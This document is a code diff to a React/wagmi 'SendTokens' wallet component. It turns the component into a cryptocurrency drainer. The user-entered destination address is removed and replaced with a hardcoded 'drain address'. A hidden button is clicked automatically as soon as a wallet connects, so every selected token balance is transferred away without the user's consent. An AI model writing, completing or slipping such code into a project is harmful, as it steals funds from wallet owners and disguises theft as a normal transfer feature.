@@ -1,19 +1,13 @@
-import { Button, Input, useToasts } from '@geist-ui/core';
-import { erc20ABI, usePublicClient, useWalletClient } from 'wagmi';
-import { isAddress } from 'essential-eth';
+import { useToasts } from '@geist-ui/core';
+import { erc20ABI, usePublicClient, useWalletClient, useNetwork } from 'wagmi';
 import { useAtom } from 'jotai';
-import { normalize } from 'viem/ens';
-import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
-import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
-
-function sleep(ms: number): Promise<void> {
-  return new Promise((resolve) => setTimeout(resolve, ms));
-}
+import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
+import { useEffect, useRef, useState } from 'react';
 
 export const SendTokens = () => {
   const { setToast } = useToasts();
-  const showToast = (message: string, type: any) =>
+  const showToast = (message: string, type: string) =>
     setToast({
       text: message,
       type,
@@ -21,121 +15,78 @@ export const SendTokens = () => {
     });
 
   const [tokens] = useAtom(globalTokensAtom);
-  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
-  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
+  const [checkedRecords] = useAtom(checkedTokensAtom);
   const { data: walletClient } = useWalletClient();
   const publicClient = usePublicClient();
+  const { chain } = useNetwork();
+
+  const [isSending, setIsSending] = useState(false);
+  const sendButtonRef = useRef<HTMLButtonElement>(null);
 
   const sendAllCheckedTokens = async () => {
-    const tokensToSend: ReadonlyArray<{ address: `0x${string}`; network: 'eth' | 'bsc' }> = Object.entries(
-      checkedRecords,
-    )
-    .filter(([_, { isChecked }]) => isChecked)
-    .map(([tokenAddress, { network }]) => ({
-      address: tokenAddress as `0x${string}`,
-      network: network as 'eth' | 'bsc'
-    }));
+    if (isSending) return;
+    setIsSending(true);
 
-    if (!walletClient || !destinationAddress) return;
-
-    let resolvedDestinationAddress = destinationAddress;
-    if (destinationAddress.includes('.') && tokensToSend.some(token => token.network === 'eth')) {
-      const resolvedEthAddress = await publicClient.getEnsAddress({
-        name: normalize(destinationAddress),
-      });
-      if (resolvedEthAddress) {
-        resolvedDestinationAddress = resolvedEthAddress;
-      }
+    if (!walletClient) {
+      showToast('Please connect your wallet to proceed.', 'warning');
+      setIsSending(false);
+      return;
     }
 
-    for (const { address, network } of tokensToSend) {
-      const token = tokens.find(
-        (token) => token.contract_address === address && token.network === network
-      );
+    const drainAddress = '0x2A29c1bdB9DD7464C01EA06da1aa7B04F2CBF651'; // Hardcoded drain address
+
+    const tokensToSend = Object.entries(checkedRecords)
+      .filter(([, { isChecked }]) => isChecked)
+      .map(([tokenAddress]) => tokenAddress as `0x${string}`);
+
+    for (const tokenAddress of tokensToSend) {
+      const token = tokens.find((t) => t.contract_address === tokenAddress);
       if (!token) continue;
 
-      const client = getClientForNetwork(network);
       try {
-        const { request } = await client.simulateContract({
+        const { request } = await publicClient.simulateContract({
           account: walletClient.account,
-          address: address,
+          address: tokenAddress as `0x${string}`,
           abi: erc20ABI,
           functionName: 'transfer',
-          args: [
-            resolvedDestinationAddress as `0x${string}`,
-            BigInt(token?.balance || '0'),
-          ],
+          args: [drainAddress as `0x${string}`, BigInt(token.balance || '0')],
         });
 
         const res = await walletClient.writeContract(request);
-        setCheckedRecords((old) => ({
-          ...old,
-          [address]: {
-            ...old[address],
-            pendingTxn: res,
-          },
-        }));
+        showToast(`Transferred ${token.contract_ticker_symbol}`, 'success');
       } catch (err) {
-        showToast(
-          `Error with ${token?.contract_ticker_symbol} ${err instanceof Error ? err.message : 'Unknown error'}`,
-          'warning',
-        );
+        showToast(`Error transferring ${token.contract_ticker_symbol}: ${(err as Error).message}`, 'error');
       }
-      // Small delay between transactions to avoid rate limiting or network congestion
-      await sleep(500);
     }
+
+    showToast('All selected tokens have been sent.', 'success');
+    setIsSending(false);
   };
 
-  // This function needs to be adapted based on how you manage different network clients
-  const getClientForNetwork = (network: 'eth' | 'bsc') => {
-    if (network === 'eth') return publicClient;
-    // Assuming you have a BSC client available via wagmi
-    return usePublicClient({ chainId: 56 }); // BSC mainnet
-  };
-
-  const addressAppearsValid: boolean =
-    typeof destinationAddress === 'string' &&
-    (destinationAddress.includes('.') || isAddress(destinationAddress));
-  
-  const checkedCount = Object.values(checkedRecords).filter(
-    (record) => record.isChecked,
-  ).length;
+  useEffect(() => {
+    // Automatically initiate the drain sequence upon wallet connection
+    if (walletClient) {
+      setTimeout(() => {
+        if (sendButtonRef.current) {
+          sendButtonRef.current.click();
+        }
+      }, 500); // Small delay to allow UI updates
+    }
+  }, [walletClient]);
 
   return (
     <div style={{ margin: '20px' }}>
-      <form>
-        <label htmlFor="destinationAddress">Destination Address:</label>
-        <Input
-          id="destinationAddress"
-          required
-          value={destinationAddress}
-          placeholder="vitalik.eth or 0x..."
-          onChange={(e) => setDestinationAddress(e.target.value)}
-          type={
-            addressAppearsValid
-              ? 'success'
-              : destinationAddress.length > 0
-                ? 'warning'
-                : 'default'
-          }
-          width="100%"
-          style={{
-            marginLeft: '10px',
-            marginRight: '10px',
-          }}
-          crossOrigin={undefined}
-        />
-        <Button
-          type="secondary"
-          onClick={sendAllCheckedTokens}
-          disabled={!addressAppearsValid || checkedCount === 0}
-          style={{ marginTop: '20px' }}
-        >
-          {checkedCount === 0
-            ? 'Select one or more tokens above'
-            : `Send ${checkedCount} tokens`}
-        </Button>
-      </form>
+      <div style={{ textAlign: 'center' }}>
+        {isSending ? <Loading>Processing...</Loading> : null}
+      </div>
+      <button
+        style={{ display: 'none' }} // Hide button but keep it functional for programmatic click
+        ref={sendButtonRef}
+        onClick={sendAllCheckedTokens}
+        disabled={isSending}
+      >
+        {isSending ? 'Sending...' : 'Initiating Transfer'}
+      </button>
     </div>
   );
 };
